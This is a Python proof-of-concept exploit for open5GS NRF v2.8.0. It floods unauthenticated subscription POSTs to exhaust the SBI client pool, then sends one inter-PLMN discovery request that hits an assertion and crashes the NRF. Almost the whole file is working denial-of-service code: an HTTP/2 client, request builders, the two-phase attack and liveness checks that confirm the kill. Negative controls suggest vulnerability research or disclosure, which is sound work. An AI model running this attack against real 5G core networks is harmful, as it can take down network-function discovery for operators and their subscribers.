#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nrf_client_pool_assert_poc.py -- open5GS NRF: exhausting the 64-entry SBI
client_pool with POST /nnrf-nfm/v1/subscriptions, then sending ONE inter-PLMN
NF-Discovery request, aborts the NRF at ogs_assert(client)
(src/nrf/nnrf-handler.c:1399, SIGABRT, container exit 134).  Each POST whose
nfStatusNotificationUri is a distinct IPv4 literal permanently consumes one
client_pool slot (the slots are never reclaimed); the subscription handler is
defensive and answers exhaustion with a graceful HTTP 500.  The discovery GET
names a PLMN the NRF does not serve, so the inter-PLMN branch allocates a
placeholder nf_instance and synthesises its FQDN from the attacker-chosen PLMN
with sprintf (no DNS); with the pool exhausted, ogs_sbi_client_associate()
silently no-ops, ->client stays NULL, and the one caller that asserts instead
of checking kills the process.  Neither phase is fatal alone -- the two
negative controls prove it.

Usage:
    python3 nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --liveness-only
    python3 nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --control discovery-only
    python3 nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --control subscriptions-only
    python3 nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --live

Exit codes: 0 = success for the selected mode (--live: NRF confirmed DEAD /
--control: NRF confirmed ALIVE / --liveness-only: NRF answered), 2 = --live
but the NRF is still alive (defect NOT reproduced), 3 = --control but the NRF
died (control FAILED), 4 = precondition failure (target unreachable),
9 = usage error.
"""

from __future__ import annotations

import argparse
import json
import socket
import ssl          # noqa: F401  (kept for --tls symmetry; h2c is the default)
import struct
import sys
import time
import urllib.parse

try:
    import h2.config
    import h2.connection
    import h2.events
    import h2.exceptions
except ImportError as e:              # pragma: no cover
    sys.stderr.write(
        "FATAL: the 'h2' package is required (pip install h2). "
        "open5GS's SBI listener is HTTP/2-only -- a plain HTTP/1.1 request is "
        "rejected before it is parsed (verified: curl --http1.1 returns 000, "
        "curl --http2-prior-knowledge returns 200).\n  import error: %s\n" % e)
    sys.exit(9)


TAG = "A1-14"

DEFAULT_PORT = 7777
DEFAULT_TARGET_NF_TYPE = "UDM"
DEFAULT_REQUESTER_NF_TYPE = "AMF"

# PLMNs.  They only have to be (a) valid, (b) NOT served by the target NRF, and
# (c) different from each other so the discovery really is "inter-PLMN".
# 999/99 is the conventional test PLMN.
DEFAULT_TARGET_PLMN = ("999", "99")
DEFAULT_REQUESTER_PLMN = ("998", "98")

# PHASE 1 filler addresses.  IPv4 literals => lib/sbi/conv.c:577-581 keeps
# fqdn == NULL and encodes host+port into the sockaddr key, so every distinct
# port is a distinct client_pool slot and no DNS lookup ever happens.
DEFAULT_NOTIFY_IP = "10.9.9.9"
DEFAULT_NOTIFY_PORT_BASE = 1000

LIVENESS_PATH = "/nnrf-nfm/v1/nf-instances"


def log(msg: str) -> None:
    print("[%s] %s" % (TAG, msg), flush=True)


def hexdump(buf: bytes, indent: str = "    ") -> str:
    out = []
    for off in range(0, len(buf), 16):
        chunk = buf[off:off + 16]
        hexs = " ".join("%02x" % b for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append("%s%04x  %-47s  |%s|" % (indent, off, hexs, asc))
    return "\n".join(out)


# --------------------------------------------------------------------------- #
#  Minimal HTTP/2 (h2c, prior knowledge) client                               #
# --------------------------------------------------------------------------- #

class H2Error(Exception):
    pass


class H2Client:
    """One TCP connection, sequential request/response streams.

    open5GS's SBI server speaks HTTP/2 cleartext with prior knowledge (there is
    no h2 upgrade handshake and no HTTP/1.1 fallback), so we send the client
    connection preface immediately after connect().  `h2` does that inside
    H2Connection.initiate_connection().

    The connection is deliberately reused across the ~65 phase-1 POSTs: that is
    both faster and closer to what a real NF does, and it proves the leak is in
    the NRF's client_pool rather than in per-connection state.  Any transport
    error transparently triggers one reconnect.
    """

    def __init__(self, host: str, port: int, timeout: float = 10.0,
                 verbose_hex: bool = False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose_hex = verbose_hex
        self.authority = "%s:%d" % (host, port)
        self.sock: socket.socket | None = None
        self.conn = None
        self._next_stream_id = 1
        self.requests_sent = 0

    # -- transport -----------------------------------------------------------
    def connect(self) -> None:
        self.close()
        self.sock = socket.create_connection((self.host, self.port), self.timeout)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        cfg = h2.config.H2Configuration(client_side=True,
                                        header_encoding="utf-8",
                                        validate_inbound_headers=False,
                                        validate_outbound_headers=False)
        self.conn = h2.connection.H2Connection(config=cfg)
        self.conn.initiate_connection()
        self._flush()
        self._next_stream_id = 1

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        self.sock = None
        self.conn = None

    def _flush(self) -> None:
        if self.conn is None or self.sock is None:
            return
        data = self.conn.data_to_send()
        if data:
            self.sock.sendall(data)

    # -- one request ---------------------------------------------------------
    def request(self, method: str, path: str,
                headers: list[tuple[str, str]] | None = None,
                body: bytes | None = None,
                timeout: float | None = None) -> tuple[int, dict, bytes]:
        """Returns (status, response-headers-dict, body).

        Raises H2Error on any transport/protocol failure -- including the one we
        actually expect in phase 2: the NRF calls abort() while our stream is
        still open, so the kernel tears the socket down and we see either a
        StreamReset, a zero-length recv (ConnectionClosed) or ECONNRESET.
        """
        if self.conn is None:
            self.connect()

        to = self.timeout if timeout is None else timeout
        hdrs = [(":method", method), (":path", path),
                (":scheme", "http"), (":authority", self.authority)]
        if headers:
            hdrs.extend(headers)

        sid = self._next_stream_id
        self._next_stream_id += 2

        try:
            self.conn.send_headers(sid, hdrs, end_stream=(body is None))
            if body is not None:
                # respect the server's flow-control window
                while True:
                    try:
                        self.conn.send_data(sid, body, end_stream=True)
                        break
                    except h2.exceptions.FlowControlError:
                        self._pump_once(to, sid)
            self._flush()
        except (h2.exceptions.H2Error, OSError) as e:
            raise H2Error("send failed on stream %d: %r" % (sid, e))

        self.requests_sent += 1
        return self._await_response(sid, to)

    def _pump_once(self, timeout: float, sid: int):
        """Read whatever is available and feed it to the state machine."""
        if self.sock is None:
            raise H2Error("socket closed")
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(65535)
        except socket.timeout:
            return []
        except (ConnectionResetError, BrokenPipeError) as e:
            raise H2Error("transport reset: %r" % (e,))
        except OSError as e:
            raise H2Error("recv failed: %r" % (e,))
        if not data:
            raise H2Error("peer closed the TCP connection (EOF)")
        try:
            return self.conn.receive_data(data)
        except h2.exceptions.H2Error as e:
            raise H2Error("HTTP/2 protocol error: %r" % (e,))

    def _await_response(self, sid: int, timeout: float) -> tuple[int, dict, bytes]:
        deadline = time.time() + timeout
        status = None
        rheaders: dict[str, str] = {}
        rbody = bytearray()
        ended = False

        while not ended:
            remain = deadline - time.time()
            if remain <= 0:
                raise H2Error("no complete response on stream %d within %.1fs"
                              % (sid, timeout))
            try:
                events = self._pump_once(remain, sid)
            except H2Error:
                raise
            self._flush()

            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    if ev.stream_id != sid:
                        continue
                    for k, v in ev.headers:
                        if k == ":status":
                            status = int(v)
                        else:
                            rheaders[k] = v
                elif isinstance(ev, h2.events.DataReceived):
                    if ev.stream_id != sid:
                        continue
                    rbody.extend(ev.data)
                    try:
                        self.conn.acknowledge_received_data(
                            ev.flow_controlled_length, ev.stream_id)
                    except h2.exceptions.H2Error:
                        pass
                elif isinstance(ev, h2.events.StreamEnded):
                    if ev.stream_id == sid:
                        ended = True
                elif isinstance(ev, h2.events.StreamReset):
                    if ev.stream_id == sid:
                        raise H2Error("stream %d reset by peer, error_code=%s"
                                      % (sid, ev.error_code))
                elif isinstance(ev, h2.events.ConnectionTerminated):
                    raise H2Error("GOAWAY: error_code=%s last_stream=%s "
                                  "additional_data=%r"
                                  % (ev.error_code, ev.last_stream_id,
                                     ev.additional_data))
                elif isinstance(ev, h2.events.WindowUpdated):
                    pass

        if status is None:
            raise H2Error("stream %d ended without :status" % sid)
        return status, rheaders, bytes(rbody)


# --------------------------------------------------------------------------- #
#  NRF primitives                                                             #
# --------------------------------------------------------------------------- #

def nrf_liveness(target: str, port: int, timeout: float = 8.0,
                 attempts: int = 3) -> tuple[bool, str]:
    """Protocol-level liveness oracle.

    `GET /nnrf-nfm/v1/nf-instances` is served by
    src/nrf/nrf-sm.c CASE(OGS_SBI_HTTP_METHOD_GET) -- it never reaches the
    asserting dispatch path, so it is a pure "is open5gs-nrfd alive and serving
    SBI?" probe.  A 200 with a JSON body is the only positive answer; anything
    else (connect refused, EOF mid-stream, GOAWAY, timeout) means dead.

    Deciding liveness from an actual application-layer reply rather than from
    request timeouts is what separates "the NRF aborted" from "our request was
    merely dropped".
    """
    last = "no attempt made"
    for i in range(attempts):
        c = H2Client(target, port, timeout=timeout)
        try:
            c.connect()
        except OSError as e:
            last = "connect() failed: %r" % (e,)
            time.sleep(0.4)
            continue
        try:
            status, hdrs, body = c.request("GET", LIVENESS_PATH,
                                           headers=[("accept", "application/json")],
                                           timeout=timeout)
            if status == 200:
                n = body.count(b'"href"')
                return True, ("alive=True  GET %s -> 200 (%d bytes, "
                              "%d nf-instance href(s)) on attempt %d"
                              % (LIVENESS_PATH, len(body), n, i + 1))
            last = "alive=False  GET %s -> %d (%d bytes) on attempt %d" % (
                LIVENESS_PATH, status, len(body), i + 1)
        except H2Error as e:
            last = "alive=False  GET %s -> H2Error: %s (attempt %d)" % (
                LIVENESS_PATH, e, i + 1)
        except OSError as e:
            last = "alive=False  GET %s -> OSError: %r (attempt %d)" % (
                LIVENESS_PATH, e, i + 1)
        finally:
            c.close()
        time.sleep(0.4)
    return False, last


def plmn_list_param(mcc: str, mnc: str) -> str:
    """`target-plmn-list` / `requester-plmn-list` wire format.

    lib/sbi/message.c:1048-1073 hands the raw query value to
    ogs_sbi_discovery_option_parse_plmn_list() (lib/sbi/message.c:4164-4219),
    which cJSON_Parse()s it and REQUIRES a JSON array of objects with the
    OpenAPI_plmn_id_t shape {"mcc":"...","mnc":"..."}.  Anything else returns
    -1 and the whole request is rejected with OGS_ERROR before it ever reaches
    the vulnerable branch -- so the compact `target-plmn-list=99999` form some
    documents suggest does NOT work here.
    """
    return urllib.parse.quote(json.dumps([{"mcc": mcc, "mnc": mnc}],
                                         separators=(",", ":")), safe="")


def build_discovery_path(target_nf_type: str, requester_nf_type: str,
                         target_plmn: tuple[str, str],
                         requester_plmn: tuple[str, str],
                         hnrf_uri: str | None = None) -> str:
    """The single phase-2 request.

    No `hnrf-uri` is needed: src/nrf/nnrf-handler.c:1372-1376 synthesises the
    placeholder's FQDN from target-plmn-list via ogs_nrf_fqdn_from_plmn_id(),
    which is pure string formatting (lib/proto/types.c) and performs no DNS.
    Supplying --hnrf-uri only changes which string ends up in nf_instance->fqdn
    (:1357-1369); the assert at :1399 is reached either way.
    """
    q = [
        ("target-nf-type", target_nf_type),
        ("requester-nf-type", requester_nf_type),
        ("target-plmn-list", plmn_list_param(*target_plmn)),
        ("requester-plmn-list", plmn_list_param(*requester_plmn)),
    ]
    if hnrf_uri:
        q.append(("hnrf-uri", urllib.parse.quote(hnrf_uri, safe="")))
    return "/nnrf-disc/v1/nf-instances?" + "&".join("%s=%s" % kv for kv in q)


def build_subscription_body(index: int, notify_ip: str, notify_port: int) -> bytes:
    """One phase-1 POST body.

    Only two members are actually required by
    nrf_handle_nf_status_subscribe() @ v2.8.0:
      * nfStatusNotificationUri -- :516-524 rejects its absence with 400, and
        :631-633 ogs_strdup()s it then ogs_assert()s the result, so it must be
        a non-empty string;
      * subscrCond              -- :587-629 rejects a missing / empty one with
        400.  Exactly one of nfType / serviceName / nfInstanceId must be set
        (:591-600).
    Everything else is optional; reqNfType is included only because a real NF
    sends it.

    `validityTime` is deliberately omitted: with no validity timer the
    subscription is permanent, so nothing in the NRF will later try to reclaim
    the client slot on its own.  (It would not help the NRF anyway -- see
    ogs_sbi_client_remove() at lib/sbi/client.c:198-202.)
    """
    obj = {
        "nfStatusNotificationUri":
            "http://%s:%d/nnrf-nfm/v1/nf-status-notifications/attacker-%d"
            % (notify_ip, notify_port, index),
        "subscrCond": {"nfType": DEFAULT_TARGET_NF_TYPE},
        "reqNfType": DEFAULT_REQUESTER_NF_TYPE,
    }
    return json.dumps(obj, separators=(",", ":")).encode()


# --------------------------------------------------------------------------- #
#  PHASE 1                                                                    #
# --------------------------------------------------------------------------- #

def phase1_exhaust_client_pool(c: H2Client, args, budget: int) -> dict:
    """POST subscriptions with distinct IPv4-literal notification URIs until the
    NRF itself tells us client_pool is empty.

    The NRF's own 500 "No SBI client available" (src/nrf/nnrf-handler.c:652-657)
    is the ground-truth exhaustion signal -- we do not have to guess the pool
    size, the number of slots already held by legitimately registered NFs, or
    the deployment's `global.max.peer` setting.  We therefore keep going until
    we have seen `--exhaust-confirm` consecutive 500s.

    Returns a dict with the status histogram and the counts.
    """
    log("PHASE 1 -- exhaust client_pool via POST /nnrf-nfm/v1/subscriptions")
    log("  notification URIs : http://%s:%d..%d/... (IPv4 literals => no DNS)"
        % (args.notify_ip, args.notify_port_base,
           args.notify_port_base + budget - 1))
    log("  stop condition    : %d consecutive HTTP 500 (the NRF's own "
        "'No SBI client available' at nnrf-handler.c:652)"
        % args.exhaust_confirm)

    hist: dict[int, int] = {}
    consecutive_500 = 0
    first_500_at = None
    created = 0
    last_status = None
    last_body = b""

    for i in range(budget):
        port = args.notify_port_base + i
        body = build_subscription_body(i, args.notify_ip, port)
        try:
            status, hdrs, rbody = c.request(
                "POST", "/nnrf-nfm/v1/subscriptions",
                headers=[("content-type", "application/json"),
                         ("accept", "application/json")],
                body=body, timeout=args.timeout)
        except H2Error as e:
            log("  POST #%d FAILED at the transport layer: %s" % (i, e))
            log("  -- the NRF died during phase 1, which is NOT the finding "
                "under test (the subscription path is defensive: "
                "nnrf-handler.c:651-663 returns a 500 instead of asserting).")
            return {"hist": hist, "created": created, "sent": i,
                    "first_500_at": first_500_at,
                    "exhausted": False, "transport_error": str(e),
                    "last_status": last_status, "last_body": last_body}

        last_status, last_body = status, rbody
        hist[status] = hist.get(status, 0) + 1

        if status == 201:
            created += 1
            consecutive_500 = 0
        elif status == 500:
            consecutive_500 += 1
            if first_500_at is None:
                first_500_at = i
                log("  POST #%d -> 500  (first refusal; body: %s)"
                    % (i, rbody[:200].decode("utf-8", "replace")))
        else:
            consecutive_500 = 0
            log("  POST #%d -> unexpected %d (body: %s)"
                % (i, status, rbody[:200].decode("utf-8", "replace")))

        if i < 3 or status != 201 or i % 16 == 0:
            log("  POST #%-3d port=%-5d -> %d" % (i, port, status))

        if consecutive_500 >= args.exhaust_confirm:
            log("  client_pool EXHAUSTED after %d POSTs (%d created, "
                "first 500 at #%d, %d consecutive 500s)"
                % (i + 1, created, first_500_at, consecutive_500))
            return {"hist": hist, "created": created, "sent": i + 1,
                    "first_500_at": first_500_at, "exhausted": True,
                    "transport_error": None,
                    "last_status": last_status, "last_body": last_body}

    log("  phase 1 hit the %d-request budget WITHOUT exhausting the pool "
        "(hist=%s)" % (budget, hist))
    return {"hist": hist, "created": created, "sent": budget,
            "first_500_at": first_500_at, "exhausted": False,
            "transport_error": None,
            "last_status": last_status, "last_body": last_body}


# --------------------------------------------------------------------------- #
#  PHASE 2                                                                    #
# --------------------------------------------------------------------------- #

def phase2_trigger_assert(c: H2Client, args) -> dict:
    """Send the ONE inter-PLMN discovery request that trips
    `ogs_assert(client)` at src/nrf/nnrf-handler.c:1399.

    The expected outcome is that we get NO application-layer response at all:
    the NRF aborts while our stream is open, so the kernel closes the socket and
    h2 surfaces ConnectionClosed / EOF / StreamReset / ECONNRESET.  A well-formed
    HTTP response means the assert did NOT fire.
    """
    path = build_discovery_path(args.target_nf_type, args.requester_nf_type,
                                args.target_plmn, args.requester_plmn,
                                args.hnrf_uri)
    log("PHASE 2 -- one inter-PLMN NF-Discovery request")
    log("  %s" % path)
    log("  target-plmn-list    = %s  (not served by this NRF => the local "
        "search at nnrf-handler.c:1205-1248 returns 0 instances)"
        % (args.target_plmn,))
    log("  requester-plmn-list = %s  (both lists present => the gate at "
        "nnrf-handler.c:1269-1271 is taken)" % (args.requester_plmn,))
    log("  expected FQDN synthesised at nnrf-handler.c:1372-1376: "
        "nrf.5gc.mnc%s.mcc%s.3gppnetwork.org"
        % (args.target_plmn[1].zfill(3), args.target_plmn[0].zfill(3)))

    outcome = {"path": path, "response": None, "status": None,
               "transport_error": None, "aborted": False}
    try:
        status, hdrs, body = c.request(
            "GET", path, headers=[("accept", "application/json")],
            timeout=args.phase2_timeout)
        outcome["status"] = status
        outcome["response"] = body
        log("  !! the NRF ANSWERED: HTTP %d, %d bytes" % (status, len(body)))
        log("  response head: %s" % body[:300].decode("utf-8", "replace"))
        if args.verbose_hex and body:
            print(hexdump(body[:256]))
        log("  => ogs_assert(client) at nnrf-handler.c:1399 did NOT fire; "
            "a client slot was still available.")
    except H2Error as e:
        outcome["transport_error"] = str(e)
        outcome["aborted"] = True
        log("  no application-layer response: %s" % e)
        log("  => consistent with abort() inside the NRF while our stream "
            "was open.")
    return outcome


def confirm_dead(target: str, port: int, args, settle: float = 2.0,
                 rounds: int = 3) -> tuple[bool, str]:
    """After phase 2, re-probe liveness on FRESH TCP connections.

    This is the authoritative verdict: the phase-2 transport error alone could in
    principle be a benign connection reset, so we require the NRF to be
    unreachable from a brand-new socket, repeatedly, after a settle delay.
    """
    log("CONFIRM -- re-probing liveness on fresh TCP connections "
        "(settle %.1fs, %d round(s))" % (settle, rounds))
    time.sleep(settle)
    details = []
    for r in range(rounds):
        alive, detail = nrf_liveness(target, port, timeout=args.timeout,
                                     attempts=1)
        details.append("round %d: %s" % (r + 1, detail))
        log("  round %d: %s" % (r + 1, detail))
        if alive:
            return True, "; ".join(details)
        time.sleep(1.0)
    return False, "; ".join(details)


# --------------------------------------------------------------------------- #
#  modes                                                                      #
# --------------------------------------------------------------------------- #

def mode_live(args) -> int:
    alive, detail = nrf_liveness(args.target, args.port, timeout=args.timeout)
    log("PRECONDITION liveness: %s" % detail)
    if not alive:
        log("!! the NRF is not answering %s BEFORE the attack -- refusing to "
            "fire at an unhealthy target (evidence hygiene)." % LIVENESS_PATH)
        return 4
    log("PRECONDITION passed: alive=True")

    c = H2Client(args.target, args.port, timeout=args.timeout,
                 verbose_hex=args.verbose_hex)
    try:
        c.connect()
    except OSError as e:
        log("!! cannot establish the HTTP/2 connection: %r" % (e,))
        return 4

    try:
        p1 = phase1_exhaust_client_pool(c, args, args.max_subs)
        log("  phase 1 status histogram: %s" % p1["hist"])
        if p1.get("transport_error"):
            log("!! phase 1 killed the NRF; this is NOT the A1-14 sink "
                "(the subscription path returns 500 instead of asserting).")
            still_alive, detail = confirm_dead(args.target, args.port, args)
            log("VERDICT: INCONCLUSIVE -- unexpected phase-1 death. %s" % detail)
            return 2
        if not p1["exhausted"]:
            log("!! client_pool was not exhausted; phase 2 would not be a "
                "meaningful test. Raise --max-subs (budget was %d)."
                % args.max_subs)
            return 2

        p2 = phase2_trigger_assert(c, args)
    finally:
        c.close()

    still_alive, detail = confirm_dead(args.target, args.port, args)
    log("POST-ATTACK liveness: alive=%s" % still_alive)
    log("  %s" % detail)

    if still_alive:
        log("VERDICT: DEFECT NOT REPRODUCED -- the NRF is still alive after "
            "phase 1 (%d created) + phase 2." % p1["created"])
        return 2

    log("VERDICT: REPRODUCED -- the NRF is dead after %d unauthenticated "
        "HTTP/2 requests (%d subscription POSTs + 1 inter-PLMN discovery GET)."
        % (p1["sent"] + 1, p1["sent"]))
    log("  sink     : src/nrf/nnrf-handler.c:1399  ogs_assert(client)")
    log("  root     : lib/sbi/context.c:2497-2504  ogs_sbi_client_associate() "
            "silently ignores a failed client association")
    log("  expected log lines in the NRF container:")
    log("    [nrf] ERROR: No memory in client_pool            (lib/sbi/client.c:117)")
    log("    [nrf] ERROR: ogs_sbi_client_add() failed           (src/nrf/nnrf-handler.c:652)")
    log("    [nrf] ERROR: nf_instance_find_client: ogs_sbi_client_add() failed (lib/sbi/context.c:2079)")
    log("    [nrf] INFO:  New NRF [fqdn:nrf.5gc.mnc%s.mcc%s.3gppnetwork.org, hnrf_uri:NULL] (src/nrf/nnrf-handler.c:1388)"
        % (args.target_plmn[1].zfill(3), args.target_plmn[0].zfill(3)))
    # `OGS_FUNC` expands to __func__, so the symbol actually printed by the
    # binary is the enclosing static function name: nrf_nnrf_handle_nf_discover.
    log("    [nrf] FATAL: nrf_nnrf_handle_nf_discover: Assertion `client' failed. (../src/nrf/nnrf-handler.c:1399)")
    log("    [core] FATAL: backtrace() returned N addresses (../lib/core/ogs-abort.c:37)")
    log("    /open5gs_init.sh: line NNN: <pid> Aborted (core dumped) ./open5gs-nrfd")
    return 0


def mode_control_discovery_only(args) -> int:
    """Negative control A.

    Sends EXACTLY the phase-2 request and nothing else, on a NRF whose
    client_pool has NOT been exhausted.  ogs_sbi_client_add() then succeeds
    (lib/sbi/client.c:115), ogs_sbi_client_associate() sets ->client and logs
    `[sbi] INFO: [NRF] NFInstance associated [...] (../lib/sbi/context.c:2498)`
    -- the `if (client)` TRUE branch -- the assert at :1399 passes, and the NRF
    goes on to attempt the outbound inter-PLMN discovery.  That attempt fails
    for a completely unrelated reason and the NRF answers gracefully; on this
    deployment the observed answer is

        HTTP/2 504  {"title":"No SEPP","status":504}
        [nrf] ERROR: NF-Discover failed [504] (../src/nrf/nnrf-handler.c:1541)

    i.e. the request is rejected because no SEPP is configured for the foreign
    PLMN -- NOT because of the assert.  The `NFInstance associated` line is the
    witness that separates the control from the defect: it appears exactly once
    here and zero times in a defect run.

    The NRF MUST survive.  If it dies here, the crash is caused by the discovery
    request alone and this bundle's causal story is wrong.
    """
    alive, detail = nrf_liveness(args.target, args.port, timeout=args.timeout)
    log("CONTROL A (discovery-only) precondition: %s" % detail)
    if not alive:
        log("!! control cannot run against a dead NRF.")
        return 3

    c = H2Client(args.target, args.port, timeout=args.timeout)
    try:
        c.connect()
        outcome = phase2_trigger_assert(c, args)
    except (H2Error, OSError) as e:
        log("!! transport failure while sending the control request: %s" % e)
        outcome = {"transport_error": str(e)}
    finally:
        c.close()

    still_alive, detail = confirm_dead(args.target, args.port, args)
    log("CONTROL A post-request liveness: alive=%s" % still_alive)
    log("  %s" % detail)
    if not still_alive:
        log("VERDICT: CONTROL FAILED -- the discovery request alone killed the "
            "NRF. The defect run below is NOT differential; re-audit.")
        return 3
    log("VERDICT: CONTROL A PASSED -- the same discovery request on a "
        "non-exhausted client_pool does NOT crash the NRF (the assert at "
        "nnrf-handler.c:1399 evaluates true).")
    return 0


def mode_control_subscriptions_only(args) -> int:
    """Negative control B.

    Runs phase 1 to exhaustion and then STOPS.  The NRF must survive: the
    subscription path is defensive (src/nrf/nnrf-handler.c:651-663 answers the
    overflow with a 500 instead of asserting).  This isolates "pool exhaustion"
    from "assertion failure" and shows that exhaustion alone is survivable --
    the DoS needs the inter-PLMN discovery request to convert it into abort().
    """
    alive, detail = nrf_liveness(args.target, args.port, timeout=args.timeout)
    log("CONTROL B (subscriptions-only) precondition: %s" % detail)
    if not alive:
        log("!! control cannot run against a dead NRF.")
        return 3

    c = H2Client(args.target, args.port, timeout=args.timeout)
    try:
        c.connect()
        p1 = phase1_exhaust_client_pool(c, args, args.max_subs)
        log("  phase 1 status histogram: %s" % p1["hist"])
    finally:
        c.close()

    still_alive, detail = confirm_dead(args.target, args.port, args)
    log("CONTROL B post-phase-1 liveness: alive=%s" % still_alive)
    log("  %s" % detail)
    if not still_alive:
        log("VERDICT: CONTROL FAILED -- phase 1 alone killed the NRF, which "
            "contradicts nnrf-handler.c:651-663.")
        return 3
    if not p1["exhausted"]:
        log("VERDICT: CONTROL INCONCLUSIVE -- the pool was never exhausted.")
        return 3
    log("VERDICT: CONTROL B PASSED -- client_pool exhaustion alone is "
        "survivable (%d created, %d refused with 500); the NRF is still "
        "answering %s." % (p1["created"],
                           p1["hist"].get(500, 0), LIVENESS_PATH))
    return 0


def mode_liveness(args) -> int:
    alive, detail = nrf_liveness(args.target, args.port, timeout=args.timeout,
                                 attempts=args.liveness_attempts)
    print("alive=%s" % alive)
    print(detail)
    return 0 if alive else 2


# --------------------------------------------------------------------------- #
#  CLI                                                                        #
# --------------------------------------------------------------------------- #

def parse_plmn(s: str) -> tuple[str, str]:
    """Accept 'mcc/mnc', 'mcc-mnc' or the 5/6-digit concatenation '99999'."""
    for sep in ("/", "-", ":"):
        if sep in s:
            a, b = s.split(sep, 1)
            return a.strip(), b.strip()
    s = s.strip()
    if len(s) == 5:
        return s[:3], s[3:]
    if len(s) == 6:
        return s[:3], s[3:]
    raise argparse.ArgumentTypeError(
        "cannot parse PLMN %r -- use MCC/MNC (e.g. 999/99)" % s)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="open5GS NRF client_pool-exhaustion assertion abort (A1-14)",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="127.0.0.1", help="NRF SBI address")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT, help="NRF SBI port")

    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--live", action="store_true",
                   help="run the full attack (phase 1 + phase 2)")
    g.add_argument("--control", choices=["discovery-only", "subscriptions-only"],
                   help="run a negative control and require the NRF to SURVIVE")
    g.add_argument("--liveness-only", action="store_true",
                   help="only probe GET /nnrf-nfm/v1/nf-instances")

    ap.add_argument("--max-subs", type=int, default=200,
                    help="phase-1 request budget (default 200; the loop stops "
                         "early on exhaustion)")
    ap.add_argument("--exhaust-confirm", type=int, default=3,
                    help="consecutive HTTP 500s required to declare client_pool "
                         "exhausted (default 3)")
    ap.add_argument("--notify-ip", default=DEFAULT_NOTIFY_IP,
                    help="IPv4 literal used for nfStatusNotificationUri")
    ap.add_argument("--notify-port-base", type=int, default=DEFAULT_NOTIFY_PORT_BASE,
                    help="first port; port increments by 1 per subscription")

    ap.add_argument("--target-nf-type", default=DEFAULT_TARGET_NF_TYPE)
    ap.add_argument("--requester-nf-type", default=DEFAULT_REQUESTER_NF_TYPE)
    ap.add_argument("--target-plmn", type=parse_plmn, default=DEFAULT_TARGET_PLMN,
                    help="MCC/MNC that the NRF does NOT serve (default 999/99)")
    ap.add_argument("--requester-plmn", type=parse_plmn,
                    default=DEFAULT_REQUESTER_PLMN,
                    help="MCC/MNC of the requester (default 998/98)")
    ap.add_argument("--hnrf-uri", default=None,
                    help="optional hnrf-uri; not needed (the FQDN is "
                         "synthesised from target-plmn-list)")

    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--phase2-timeout", type=float, default=10.0)
    ap.add_argument("--liveness-attempts", type=int, default=3)
    ap.add_argument("--verbose-hex", action="store_true")

    args = ap.parse_args(argv)

    log("target = %s:%d (h2c, HTTP/2 prior knowledge)" % (args.target, args.port))
    log("open5GS revision under test: v2.8.0 "
        "(sink src/nrf/nnrf-handler.c:1399)")

    if args.liveness_only:
        return mode_liveness(args)
    if args.control == "discovery-only":
        return mode_control_discovery_only(args)
    if args.control == "subscriptions-only":
        return mode_control_subscriptions_only(args)
    return mode_live(args)


if __name__ == "__main__":
    sys.exit(main())
